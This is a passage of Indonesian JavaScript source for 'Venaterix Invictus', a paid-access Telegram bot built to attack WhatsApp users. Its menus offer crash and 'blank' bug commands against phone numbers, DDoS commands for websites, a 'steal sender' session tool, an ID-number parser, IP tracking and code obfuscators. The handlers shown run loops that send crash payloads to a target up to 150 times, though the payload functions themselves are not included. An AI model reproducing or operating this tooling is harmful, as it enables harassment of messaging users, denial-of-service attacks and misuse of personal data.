  }

  return { fixed, report, canFix };
}
//FUNCTION FIX EROR
function analyzeAndSuggestFix(code) {
  try {
    new Function(code); // cek syntax JS
    return {
      ok: true,
      message: "✅ File AMAN — tidak ditemukan syntax error."
    };
  } catch (err) {
    const msg = err.message || "";
    let fix = "Periksa ulang syntax di bagian tersebut.";

    if (/Unexpected end of input/i.test(msg)) {
      fix = "Kemungkinan kurang penutup `}` atau `)` di akhir file.";
    } else if (/Unexpected token/i.test(msg)) {
      fix = "Ada karakter salah seperti `}`, `)` atau `]`. Cek baris yang disebut.";
    } else if (/Missing \)/i.test(msg)) {
      fix = "Kurang tanda `)` pada pemanggilan function.";
    } else if (/already been declared/i.test(msg)) {
      fix = "Variable dideklarasikan dua kali. Hapus salah satu `const/let`.";
    } else if (/await is only valid/i.test(msg)) {
      fix = "Gunakan `async function` atau hapus `await`.";
    } else if (/Cannot use import/i.test(msg)) {
      fix = "Gunakan `require()` atau ubah ke module type.";
    } else if (/is not defined/i.test(msg)) {
      fix = "Variable / function belum didefinisikan atau salah nama.";
    }

    return {
      ok: false,
      error: msg,
      fix
    };
  }
}
//FUNCTION NSFW
async function fetchNSFW(tag) {
  const axios = require("axios");

  const { data } = await axios.get(
    "https://api.rule34.xxx/index.php",
    {
      params: {
        page: "dapi",
        s: "post",
        q: "index",
        tags: tag,
        json: 1,
        limit: 10
      },
      timeout: 10000
    }
  );

  if (!Array.isArray(data) || data.length === 0) return [];

  return data
    .map(v => v.file_url || v.sample_url)
    .filter(Boolean);
}
//FUNCTION ENC JS
function arrayObfuscateJS(code) {
  const stringRegex = /(["'`])((?:\\\1|.)*?)\1/g;
  const strings = [];
  const map = new Map();

  let transformed = code.replace(stringRegex, (m, q, content) => {
    if (!map.has(content)) {
      map.set(content, strings.length);
      strings.push(content);
    }
    return `_0xA[${map.get(content)}]`;
  });

  const encodedArray = strings.map(s => `"${encodeString(s)}"`);

  const header = `const _0xA = [${encodedArray.join(",")}];\n\n`;

  return header + transformed;
}
//FUNCTION ENC HTML
function encryptHTML(htmlContent) {
  const base64 = Buffer.from(htmlContent).toString("base64");

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Encrypted by denix</title>
</head>
<body>
<script>
(function(){
  const data = "${base64}";
  const decoded = atob(data);
  document.open();
  document.write(decoded);
  document.close();
})();
</script>
</body>
</html>`;
}
///=== Function Cek id ch ===\\\
async function getWhatsAppChannelInfo(link, sock) {
    if (!link.startsWith("https://whatsapp.com/channel/")) {
        return { error: "Link tidak valid!" };
    }

    const inviteCode = link.replace("https://whatsapp.com/channel/", "").trim();

    try {
        const res = await sock.newsletterMetadata("invite", {
            inviteCode
        });

        return {
            id: res.id,
            name: res.name || "-",
            followers: res.followersCount ?? "Tidak diketahui",
            verified: res.isVerified ? "Terverifikasi" : "Tidak",
            description: res.description || "-"
        };
    } catch (e) {
        console.error(e);
        return { error: "Gagal mengambil data channel (invite invalid / expired)" };
    }
}
//chek prem
async function checkPremium(msg) {
  try {
    if (!global.premiumUsers) global.premiumUsers = [];

    const userId = msg.from?.id || msg.chat?.id;

    // kalo user premium, return true
    return global.premiumUsers.includes(userId);
  } catch {
    return false;
  }
}
// --------------------- ( Bot Setting ) ---------------------- \\
function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And save prem ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./Venaterix Invictus/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./Venaterix Invictus/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./Venaterix Invictus/premium.json');
            ensureFileExists('./Venaterix Invictus/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./Venaterix Invictus/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./Venaterix Invictus/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./Venaterix Invictus/premium.json', (data) => (premiumUsers = data));
    watchFile('./Venaterix Invictus/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
////==== Fungsi buat file otomatis ====\\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

if (!fs.existsSync(cd)) {
  fs.writeFileSync(cd, JSON.stringify({ time: 0, users: {} }, null, 2));
}
// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}
///===== ( Menu Utama ) =====\\\
const TOKEN_RAW_URL =
  "https://raw.githubusercontent.com/vinxz-dev/vinxz/refs/heads/main/database.json";

const bugRequests = {};

async function checkTokenRealtime(token) {
  try {
    const config = require('./config.js');
    
    if (token !== config.BOT_TOKEN) {
      console.log(`❌ Token tidak sama dengan config.js`);
      return false;
    }
    
    console.log(`✅ Token cocok dengan config.js`);
    
    const res = await axios.get(TOKEN_RAW_URL, {
      headers: { "Cache-Control": "no-cache" },
    });

    const data = res.data;

    if (Array.isArray(data)) {
      const isValid = data.includes(token);
      if (isValid) {
        console.log(`✅ Token juga ada di database online`);
      } else {
        console.log(`❌ Token tidak ada di database online`);
      }
      return isValid;
    }

    if (data.tokens) {
      const isValid = data.tokens.includes(token);
      if (isValid) {
        console.log(`✅ Token juga ada di database online`);
      } else {
        console.log(`❌ Token tidak ada di database online`);
      }
      return isValid;
    }

    return false;
  } catch (err) {
    console.log("TOKEN RAW ERROR:", err.message);
    return false;
  }
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));

  const isPremium = premiumUsers.some(
    (user) =>
      user.id === senderId &&
      new Date(user.expiresAt) > new Date()
  );

  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>👾 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
LU SIAPA TOLOL BUY ACCSES PV`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝘽𝙪𝙮 𝘼𝙘𝙘𝙚𝙨",
              url: "https://t.me/VinxzGanteng",
            },
          ],
        ],
      },
    });
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Group Only");
  }

  bugRequests[senderId] = { step: "await_token" };

  bot.sendMessage(
    chatId,
    "🔐 TOKEN REQUIRED\n\nMasukkan token bot akses kamu:",
    { parse_mode: "Markdown" }
  );
});

bot.on("message", async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const messageId = msg.message_id;

  if (!bugRequests[senderId]) return;
  if (bugRequests[senderId].step !== "await_token") return;
  if (!msg.text) return;

  const tokenInput = msg.text.trim();

  try {
    await bot.deleteMessage(chatId, messageId);
  } catch (e) {
    console.log("Gagal hapus pesan token:", e.message);
  }

  const loadingMessage = await bot.sendMessage(
    chatId,
    "🔍 *Memeriksa...*",
    { parse_mode: "Markdown" }
  );

  const valid = await checkTokenRealtime(tokenInput);

  if (!valid) {
    setTimeout(async () => {
      try {
        await bot.deleteMessage(chatId, loadingMessage.message_id);
      } catch (e) {}
      
      const errorMsg = await bot.sendMessage(
        chatId,
        "❌ Token tidak valid!\n\nPastikan:\n1. Token sesuai dengan bot ini\n2. Token terdaftar di database\n\nHubungi @VinxzGanteng jika perlu bantuan."
      );
    }, 100);
    
    delete bugRequests[senderId];
    return;
  }

  setTimeout(async () => {
    try {
      await bot.deleteMessage(chatId, loadingMessage.message_id);
    } catch (e) {}
    
    const successMsg = await bot.sendMessage(
      chatId,
      "✅ Token valid!\nMembuka menu...",
      { parse_mode: "Markdown" }
    );
    
    setTimeout(async () => {
      try {
        await bot.deleteMessage(chatId, successMsg.message_id);
      } catch (e) {}
    }, 500);
    
    setTimeout(() => {
      const runtime = getBotRuntime();
      const randomImage = getRandomImage();
      sendMainMenu(chatId, runtime, randomImage, true);
    }, 200);
    
  }, 100);

  delete bugRequests[senderId];
});

function sendMainMenu(chatId, runtime, randomImage, isPremium) {
  const caption = `<blockquote>( 👾 ) ⪼ Venaterix ⵢ Invictus</blockquote>
 ( 🤖 ) こんにちは、私は Venaterix Invictus です。
私は @VinxzGanteng によって、あなたを支援するための Telegram・WhatsApp ボット として作成されました。
どうか 不正に使用しないでください。
<blockquote><pre>⬡═―—⊱ ⎧ 𝗜𝗡𝗙𝗢𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 ⎭ ⊰―—═⬡</pre></blockquote>
• Developer: @VinxzGanteng
• Developer²: @deni_not_style3
• Version: 8.0 Vip buyer 
• Prefix: / ( slash )
• Language: JavaScript
• Status      : ${isPremium ? "Premium" : "No Access"}
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
<blockquote>VinxzOfficial[🌚]</blockquote>
`;

  const buttons = [
    [
      { text: "ᖫ X ᖭ Attack", callback_data: "bugshow", style : "success" },
      { text: "ᖫ X ᖭ Tools", callback_data: "tools", style : "danger" },
    ],
    [
      { text: "ᖫ X ᖭ Owner", callback_data: "ownermenu", style : "success" },
      { text: "ᖫ X ᖭ Thanks To", callback_data: "thanksto", style : "danger" },
    ],
    [
      {
        text: "ᖫ X ᖭ Author",
        url: "https://t.me/VinxzGanteng", style : "success", 
      },
      {
        text: "ᖫ X ᖭ Channel Author",
        url: "https://t.me/vnxzgntng", style : "danger", 
      },
    ],
  ];

  bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons },
  });
}

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const senderId = callbackQuery.from.id;

  const isPremium = premiumUsers.some(
    user => user.id === senderId && new Date(user.expiresAt) > new Date()
  );

  let newCaption = "";
  let newButtons = [];

  // ===== BUG MENU =====
  if (data === "bugshow") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗡𝗢 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 ⎭ ⊰―—═⬡</pre></blockquote>
⚊▣ /Crashed 62xxx  
⚊▣ /VenaUi 62xxx  
⚊▣ /VenaBlank 62xxx  
⚊▣ /Crot 62xxx  - combo all bug
<blockquote>ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ</blockquotee>`;

    newButtons = [
      [
        { text: "ᖫ X ᖭ INVISIBLE", callback_data: "buginvis", style : "success" },
        { text: "! Back", callback_data: "mainmenu", style : "primary" }
      ]
    ];
     
  // ===== BUG INVIS =====
  } else if (data === "buginvis") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 </blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 ⎭ ⊰―—═⬡</pre></blockquote>
⚊▣ /VenaRorw 62xxx  
⚊▣ /DenixVena 62xxx  
⚊▣ /Crot 62xxx  - combo all bug
#SELLECT THE CMD`;

    newButtons = [
      [
        { text: "! Back", callback_data: "bugshow", style : "danger" }, 
        { text: "ᖫ X ᖭ NEXT?", callback_data: "new", style : "primary" }
      ]
    ];
    
      // ===== FITUR LAIN MEMEK =====
  } else if (data === "new") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 </blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 ⎭ ⊰―—═⬡</pre></blockquote>
⚊▣ /ddoswebsite - ddos web
    ➥ ddoswebsite [target] [port] [threads] [duration]
    
⚊▣ /ddosv2 - DDoS web versi 2
    ➥ /ddosv2 example.com 80 500 120 MIXED
    
⚊▣ /Group - Bug Group
    ➥ /Group https://whatsappxxxx
    
⚊▣ /testfunc  Reply Function To Test Function 
    ➥ /testfunc 62xxx,5
#SELLECT THE CMD`;

     newButtons = [
      [
        { text: "! Back", callback_data: "buginvis", style : "success" }
      ]
    ];
    
  // ===== OWNER MENU =====
  } else if (data === "ownermenu") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 </blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗠𝗘𝗡𝗨 ⎭ ⊰―—═⬡</pre></blockquote>
• /addprem - Input ID  
• /delprem - Input ID  
• /addadmin - Input ID  
• /deladmin - Input ID  
• /listprem - list premium  
• /setjeda - s/m/d  
• /connect - 62xx  
• /gconly - on/off
#SELLECT THE CMD`;

    newButtons = [
      [
        { text: "! Back", callback_data: "mainmenu", style : "primary" }
      ]
    ];

  // ===== TOOLS MENU 1 =====
  } else if (data === "tools") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 ⎭ ⊰―—═⬡</pre></blockquote>  
• /convertstc - reply photo convert to stc    
• /catbox - reply photo generate link catbox    
• /csessions - steal sender    
• /nikparse - nik parse    
• /iqc - iqc tools    
• /nsfw - 18+ search  
• /info - reply or tag user info  
• /cekganteng - cek ganteng  
• /cekch - cek info channel
• /getmediafire - download file - link Mediafire  
#SELLECT THE CMD`;

    newButtons = [
      [
        { text: "Next ➡️", callback_data: "tools2", style : "primary" },
        { text: "! Back", callback_data: "mainmenu", style : "success" }
      ]
    ];

  // ===== TOOLS MENU 2 =====
  } else if (data === "tools2") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨² ⎭ ⊰―—═⬡</pre></blockquote>  
• /ig - ig tools    
• /brat - stc brat    
• /trackip - track ip    
• /cekidch - cek id ch    
• /tiktokdl - download vid tiktok  
• /ipdomainc - chek ip url  
• /pinterest - search pin  
• /cekfunc - cek eror
• /cekerr - cek error
• /enchtml - enc html
• /encjs - enc js
• /unpin - unpin sematan
• /unpinall - unpin all sematan 
• /pinned - tampilkan all sematan
• /pin - pin pesan
• /cfixeror - cek eror + saran fix eror
• /fixerorr - fix eror JavaScript otomatis
#SELLECT THE CMD`;

    newButtons = [
      [
        { text: "⬅️ Back", callback_data: "tools", style : "primary" },
        { text: "! Back", callback_data: "mainmenu", style : "danger" }
      ]
    ];

  // ===== THANKS TO =====
  } else if (data === "thanksto") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 </blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ⎭ ⊰―—═⬡</pre></blockquote>
• @VinxzGanteng - Author
• @Gabrieltzyproooool - wolf
• @TakaReal - Taka imup
• @kepomemek - Kingdoms
• @NexiRajaIblis - my friends
• @Mars4Sex - my friends
• @VinxzGanteng - my friends
#BIG RESPECT FOR ALL SUPPORT ME`;

    newButtons = [
      [
        { text: "! Back", callback_data: "mainmenu", style : "primary" }, 
        { text: "ᖫ X ᖭ Tqto", callback_data: "tqpt", style : "success" }
      ]
    ];

     // ===== THANKS TO PT =====
  } else if (data === "tqpt") {
    newCaption =
`<blockquote>👾𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 </blockquote>
<blockquote><pre>⬡═―—⊱ ⎧ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗣𝗔𝗥𝗧𝗡𝗘𝗥 ⎭ ⊰―—═⬡</pre></blockquote>
• @zxhr_1 - pt me
• @Raffnotdev - pt me
• @LynzzSadboy - pt me
• @ManForceX_Official - pt me
• @hanssboyssss - pt me
• @coganzhost -pt me
• @albedo3141 - pt me
• @matzbern - pt me
• @Yanznew - pt me
• @ZynStore2_my - pt me
• @PutriStecu01 - pt me
• @CrownBancet - pt me
#BIG RESPECT FOR ALL SUPPORT ME`;

        newButtons = [
      [
        { text: "! Back", callback_data: "thanksto", style : "primary" }
      ]
    ];
    
  // ===== MAIN MENU =====
  } else if (data === "mainmenu") {
    const runtime = getBotRuntime();
    newCaption =
`<blockquote>( 👾 ) ⪼ Venaterix ⵢ Invictus</blockquote>
 ( 🤖 ) こんにちは、私は Venaterix Invictus です。
私は @VinxzGanteng によって、あなたを支援するための Telegram・WhatsApp ボット として作成されました。
どうか 不正に使用しないでください。
<blockquote><pre>⬡═―—⊱ ⎧ 𝗜𝗡𝗙𝗢𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 ⎭ ⊰―—═⬡</pre></blockquote>
• Developer: @VinxzGanteng
• Version: 8.0 Vip buyer 
• Prefix: / ( slash )
• Language: JavaScript
• Status      : ${isPremium ? "Premium" : "No Access"}
#SELLECT THE BUTTON MENU`;

    newButtons = [
      [
        { text: "ᖫ X ᖭ Attack", callback_data: "bugshow", style : "danger" },
        { text: "ᖫ X ᖭ Tools", callback_data: "tools", style : "primary" }
      ],
      [
        { text: "ᖫ X ᖭ Owner", callback_data: "ownermenu", style : "danger" },
        { text: "ᖫ X ᖭ Thanks To", callback_data: "thanksto", style : "primary" }
      ],
      [
        { text: "ᖫ X ᖭ Author", url: "https://t.me/VinxzGanteng", style : "danger" },
        { text: "ᖫ X ᖭ Channel Author", url: "https://t.me/vnxzgntng", style : "primary" }
      ]
    ];
  }

  try {
    await bot.editMessageCaption(newCaption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: newButtons }
    });
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      return bot.answerCallbackQuery(callbackQuery.id, {
        text: "Sudah di menu ini.",
        show_alert: false
      });
    } else {
      console.error("Gagal edit caption:", err);
    }
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

// ======= ( Parameter ) ======= \\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
async function CrashHard(target) {
    for (let i = 0; i < 10; i++) {
    await Depelonper(sock, target);
    await sleep(1000);
    console.log(chalk.yellow(`Venaterix Invictus - Sending bu Infinity Crash 🥶`));
    }
    }
  
async function Blank(target) {
    for (let i = 0; i < 120; i++) {
    await R9XGamma(sock, target);
    await sleep(1000);
    console.log(chalk.yellow(`Venaterix Invictus - Sending bu Infinity Blank 🥶`));
    }
    }

async function delay(target) {
    for (let i = 0; i < 40; i++) {
    await DelayInvisSpam(sock, target);
    await sleep(6000);
    console.log(chalk.yellow(`Venaterix Invictus - Sending bug Delay Bebas Spam To Target 🦇`));
    }
    }
    
 async function combo(target) {
    for (let i = 0; i < 150; i++) {
    await CrashPayload(sock, target);
    await sleep(2000);
    console.log(chalk.yellow(`Venaterix Invictus - Sending bug forclose To Target 🦠`));
    }
    }
//// =====( CASE BUG 1 ) ===== \\\\
bot.onText(/\/VenaRorw (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaRorw
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 100));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaRorw
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await delay(jid);
         
        
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaRorw
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Crashed (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "primary" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crashed
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crashed
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await CrashHard(jid);
         
        
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crashed
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Crot (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

